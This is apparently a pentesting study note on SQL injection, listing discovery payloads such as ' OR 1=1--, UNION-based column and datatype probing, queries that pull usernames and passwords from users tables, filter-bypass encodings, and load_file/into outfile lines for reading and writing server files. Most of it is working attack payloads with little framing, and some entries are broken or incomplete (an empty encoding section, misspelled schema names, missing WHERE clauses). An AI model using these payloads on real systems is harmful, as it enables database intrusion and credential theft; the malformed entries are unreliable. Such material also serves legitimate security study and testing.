## Chapter 9 : SQL 


1) Check user input vulnerability points : URL, fields, User-agent, Language 


2) Test the user inputs with basic payloads to check if the vulnerability and type of injections : __Blind, Band, Error_Based__ SQL


3) Query the number of the columns in the databasee


4) Find out the datatype of the columns


5) Extract basic information as the version or database name 


&nbsp;
&nbsp;
&nbsp;


### Discovery


__Type 1:Straightforward__


1- Submit a single quotation mark as the item of data you are targeting.



__Basic Discovery Commands :__



Examples :


>> __' OR 1=1 ;--__ 
    
>> __') OR 1=1; --__ 
   
>> __' and 'a'='a__

>> __' and 'a'='b__

   
&nbsp;
&nbsp;
&nbsp;



2- It is important to keep in mind that not all vulnerabilities are straighforward.
   It is essential while testing to look for the behavior of the application:


 - __Error_based:__ the application shows the error to the end user 


- __Blind__ does not show any thing back to the user. It is mainly revolves on booleans
	 of True or False (application behavior)


- __Band__


__Note:__ It is always recommend to probe the applcation as Blind SQL injection, if the basic payloads did not work 


&nbsp;
&nbsp;

__Type 2:Bypass Filters __


1- Use the above commands in encoding manner in order to bypass filters 


__Basic Encodign Commands:__


Examples:


>>


>>



--------------------------------------------------------------------------------------------------------------------

### Probing the Database 


__The UNION Operator__


1- Easily extract arbitrary data from within
  the database

&nbsp;
2- UNION is supported by all major DBMS products.

&nbsp;
3- Your first task is to discover the number of columns returned by the original
  query being executed by the application. You can do this in two ways:

&nbsp;
4- You can exploit the fact that NULL can be converted to any data type to
  systematically inject queries with different numbers of columns until your
  injected query is executed
  

>>    ‘ UNION SELECT NULL--
>>       ‘ UNION SELECT NULL, NULL--
>>      ‘ UNION SELECT NULL, NULL, NULL--

&nbsp;
5- Having identified the required number of columns, your next task is to
  discover a column that has a string data type so that you can use this to
  extract arbitrary data from the database


 >>    ‘ UNION SELECT ‘a’, NULL, NULL--
 >>     ‘ UNION SELECT NULL, ‘a’, NULL--
 >>     ‘ UNION SELECT NULL, NULL, ‘a’--

&nbsp;
6- In Oracle databases, every SELECT statement must include a FROM
  attribute, so injecting UNION SELECT NULL produces an error regardless of
 the number of columns. You can satisfy this requirement by selecting from the
 globally accessible table DUAL. For example:


  >>>>  ‘ UNION SELECT NULL FROM DUAL--


&nbsp;
7- When you have identified the number of columns required in your injected
  query, and have found a column that has a string data type, you are in a position
  to extract arbitrary data.

  >>  EX: ‘ UNION SELECT @@version,NULL,NULL--
	
  >>   ‘ UNION SELECT banner,NULL,NULL FROM v$version-- | ORACLE



&nbsp;
&nbsp;
&nbsp;

-------------------------------------------------------------------------------------------------

### Exploitation : 


__Extracting Data with UNION__


__Type 1: Straightforward___


1- Find out the names of the database tables and columns that
  may contain interesting information


  __EX: Name=Matthew’%20union%20select%20table_name,column_name,null,null,
      null%20from%20information_schema.columns--__


2- Select the required column

	__Ex: Name=Matthew’%20UNION%20select%20username,password,null,null,null%20  
	from%20users--__



__Note:__

The information_schema is supported by MS-SQL, MySQL, and many
other databases, including SQLite and Postgresql. It is designed to hold database
metadata,EXCEPT ORACLE


__ORACLE: SELECT table_name,column_name FROM all_tab_
	columns to retrieve information about tables and columns in the database.__



3- Search for interesting pieces of inforamtion:

 __EX: SELECT table_name,column_name FROM information_schema.columns where
      column_name LIKE ‘%PASS%’__

&nbsp;
&nbsp;


__Type 2 : Bypass Filters__


__Method 1:__  Sometimes when injecting the payload, it wont work as the url is encoded or common characters are removed 


 >> select ename,sal from emp where ename=’marcus’:


__Encoding with ASCII__

	__Ex: SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)__


	__Ex: SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)__



__Method 2:__  if the query does not work, there might be a filter for words :


	__Ex: 	SeLeCt
		%00SELECT
		SELSELECTECT
		%53%45%4c%45%43%54
		%2553%2545%254c%2545%2543%2554__


__Method 3:__ Using SQL Comments

		
	__EX: SELECT/*foo*/username,password/*foo*/FROM/*foo*/users__

	     __SEL/*foo*/ECT username,password FR/*foo*/OM users___



__Method 4:__ Dealing with single quotes issue:

		

- Sometimes single quote causes error in the database 

		
		
- To exploit this vulnerability, an attacker can simply register a username
  containing his crafted input, and then attempt to change his password. 


 __EX: ‘ or 1 in (select password from users where username=’admin’)--___


&nbsp;
&nbsp;

## More Examples :


>> union select 1, 2, 3 %23                  &nbsp;&nbsp;  |  Bypass Web filters  | 


>> uNioN+sEleCt+1,2+%23                      &nbsp;&nbsp;  |  Bypass Web filters  |  


>> uNioN`/**/`sEleCt`/**/`1,2`/**/`%23       &nbsp;&nbsp;  |  Bypass Web filters  | 
>>

>> UniOn selEct 1,version() /*


>> UniOn selEct 1,database() /*


>> UniOn selEct 1,user() /*


>> UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*


>> UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*


>> UniOn selEct 1,[column name] frOm [table name] /*


>> UniOn selEct 1,load_file('file location') /*   Reading files:


>> UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*  Writing files 


>> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   


>>  ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' | 


>>  ' union select username, pass, is_admin from 'accounts' &nbsp;&nbsp;  | 


>>  ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb 











